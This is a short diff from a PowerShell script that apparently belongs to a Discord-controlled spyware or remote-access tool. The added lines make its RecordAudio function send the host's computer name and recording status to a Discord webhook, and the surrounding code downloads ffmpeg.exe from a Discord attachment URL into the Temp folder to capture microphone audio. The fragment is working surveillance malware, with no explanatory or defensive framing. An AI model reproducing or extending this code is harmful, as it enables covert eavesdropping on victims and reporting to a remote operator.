@@ -229,6 +229,8 @@ while ($true) {
 
 Function RecordAudio{
 param ([int[]]$t)
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording audio for $t seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 $Path = "$env:Temp\ffmpeg.exe"
 If (!(Test-Path $Path)){  
 $url = "https://cdn.discordapp.com/attachments/803285521908236328/1089995848223555764/ffmpeg.exe"
